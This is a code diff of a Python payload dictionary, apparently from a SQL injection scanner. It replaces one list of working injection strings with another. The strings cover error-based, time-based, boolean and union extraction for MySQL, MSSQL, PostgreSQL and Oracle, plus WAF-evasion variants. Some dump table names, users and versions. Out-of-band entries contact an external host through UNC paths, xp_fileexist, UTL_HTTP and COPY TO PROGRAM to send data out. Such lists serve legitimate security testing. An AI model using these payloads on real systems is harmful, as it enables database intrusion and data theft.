@@ -4,56 +4,41 @@
 # --- SQL Injection Payloads ---
 SQLI_PAYLOADS = {
     "error_based": [
-        "'", "\"", "`", "');", "';", "\";", # Basic syntax breakers
-        "' AND 1=CAST(@@VERSION AS INTEGER)--", # MSSQL Version Error
-        "' AND 1=CONVERT(int, @@VERSION)--", # MSSQL Version Error Alt
-        "' UNION SELECT @@VERSION--", # Generic Version (Might work)
-        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58),CHAR(118),CHAR(112),CHAR(117),CHAR(58),(SELECT (SLEEP(0))),CHAR(58),CHAR(100),CHAR(100),CHAR(111),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)--", # MySQL Error
-        "' AND extractvalue(rand(),concat(0x3a,version()))--", # MySQL XPath Error
-        "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH(USER)--", # Oracle Error
-        "' AND 1=(select count(*) from all_tables where 1=1 and ROWNUM=1 and 1/0 = 1 )--", # Oracle Division by Zero
-        "' AND 1=CAST(VERSION() AS INT)--", # PostgreSQL Type Error
-        "' AND 1=CAST(PG_SLEEP(0) AS TEXT)--", # PostgreSQL Sleep (adjust time in engine)
-        "' AND 1=JSON_OBJECT('sql',@@VERSION)--", # Check JSON support
+        "' AND 1=CAST((SELECT SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),1,1024)) AS INT)--", # MySQL Table Extraction
+        "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT CONCAT_WS(0x3a,USER(),DATABASE(),VERSION()) FROM dual)))--", # MySQL XPath Abuse
+        "' AND 1=UPDATEXML(NULL,CONCAT(0x3a,(SELECT @@version)),1)--", # MySQL XML Corruption
+        "' AND 1=(SELECT * FROM (SELECT(X)FROM(SELECT(X)FROM(SELECT(X)FROM(SELECT 1/(LENGTH(@@version)-LENGTH(@@version)+1)X)X)X)X))--", # Nested Division Trick
+        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(58),VERSION(),CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)--", # MySQL Error with Randomization
     ],
     "blind_time": [
-        "' AND SLEEP(SLEEP_TIME)--", # MySQL, MariaDB
-        "'; WAITFOR DELAY '0:0:SLEEP_TIME'--", # MSSQL
-        "' AND pg_sleep(SLEEP_TIME)--", # PostgreSQL
-        "' AND dbms_lock.sleep(SLEEP_TIME)--", # Oracle (requires privileges)
-        "' AND randomblob(SLEEP_TIME*100000000)--", # SQLite (approximate)
-        "' OR IF(1=1, SLEEP(SLEEP_TIME), 0)--", # MySQL Conditional
-        "' RLIKE SLEEP(SLEEP_TIME)--", # MySQL Regex Based
+        "' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0,BENCHMARK(5000000,SHA1(1)),0)--", # MySQL Benchmark Delay
+        "' AND IF(1=1,RLIKE(SELECT CONCAT(CHAR(65),REPEAT(CHAR(66),1000000))),0)--", # MySQL Regex Overload
+        "'; DECLARE @x INT; SET @x=1; WHILE @x<10000000 BEGIN SET @x=@x+1 END--", # MSSQL Loop Delay
+        "' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE NULL END)--", # PostgreSQL Conditional Sleep
+        "' AND DBMS_UTILITY.WAIT_ON_PENDING_DML('nonexistent',CAST(5 AS NUMBER))--", # Oracle Wait Trick
     ],
     "blind_boolean": [
-        "' AND 1=1--",
-        "' AND 1=2--",
-        "' AND SUBSTRING(VERSION(),1,1)='5'--", # Check specific version char
-        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", # Check table existence
-        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97--", # Check specific character (adjust query)
+        "' AND EXISTS(SELECT 1 WHERE SUBSTRING((SELECT DATABASE()),1,1)=CHAR(97))--", # MySQL Char Comparison
+        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME REGEXP BINARY '^u')>0--", # MySQL Regex Table Check
+        "' AND 1=(CASE WHEN (SELECT SUBSTRING(@@version,1,1))='5' THEN 1 ELSE 0 END)--", # MSSQL Version Check
+        "' AND (SELECT LENGTH(CAST(CURRENT_USER AS TEXT)))=LENGTH(CURRENT_USER)--", # PostgreSQL Type Casting
     ],
-    "union_based": [ # Need to determine column count first
-        "' UNION SELECT NULL--",
-        "' UNION SELECT NULL,NULL--",
-        "' UNION SELECT NULL,NULL,NULL--",
-        "' UNION SELECT 1,2,3--",
-        "' UNION SELECT @@VERSION,DATABASE(),USER()--", # Example Info Leak
+    "union_based": [
+        "' UNION ALL SELECT NULL,CONCAT(CHAR(58),HEX(UNHEX(@@version)),CHAR(58)),NULL--", # MySQL Hex Encoded Version
+        "' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),NULL,NULL--", # MySQL Table Dump
+        "' UNION SELECT NULL,(SELECT UTL_INADDR.GET_HOST_NAME('localhost') FROM DUAL),NULL--", # Oracle Hostname
     ],
-    "oob": [ # Out-of-Band - Requires Interactsh or similar
-        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\\\', 'abc'))--", # MySQL UNC
-        "'; EXEC xp_dirtree '\\\\INTERACTSH_URL\\test';--", # MSSQL xp_dirtree
-        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--", # Oracle UTL_HTTP
-        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--", # Oracle DNS
-        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--", # PostgreSQL Program execution
+    "oob": [
+        "' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(CONCAT(DATABASE(),0x2e,'INTERACTSH_URL'))),'.INTERACTSH_URL\\x')))--", # MySQL UNC Hex Encoded
+        "'; EXEC master.dbo.xp_fileexist '\\\\INTERACTSH_URL\\test.txt'--", # MSSQL File Existence OOB
+        "' UNION SELECT (SELECT CHR(65)||UTL_HTTP.REQUEST('http://INTERACTSH_URL/'||USER)) FROM DUAL--", # Oracle HTTP with Concat
     ],
     "waf_evasion": [
-        "'/**/OR/**/1=1--",
-        "'%09OR%091=1--", # Tab based
-        "'%0AOR%0A1=1--", # Newline based
-        "'/*!50000OR*/1=1--", # MySQL Versioned Comment
-        "' UniON SeLeCt @@version --", # Case variation
-        "'+UNION+ALL+SELECT+NULL,NULL,NULL--", # URL Encoded Space
-        "%27%20OR%20%271%27=%271", # Full URL Encoding
+        "'/**/UNION/**/ALL/**/SELECT/**/NULL,@@version,NULL--", # MySQL Inline Comments
+        "'%0bOR%0bASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--", # Vertical Tab Obfuscation
+        "'+UNION+ALL+SELECT+NULL,CONCAT(CHAR(58),CAST(VERSION()+AS+CHAR),CHAR(58)),NULL--", # URL Encoded Spaces
+        "'/*!50000AND*/(SELECT*FROM(SELECT(SLEEP(0)))a)--", # MySQL Versioned Comment with Subquery
+        "' OR 1=CAST(HEX(UNHEX('31')) AS INT)--", # Hex Encoded '1'
     ]
 }
 
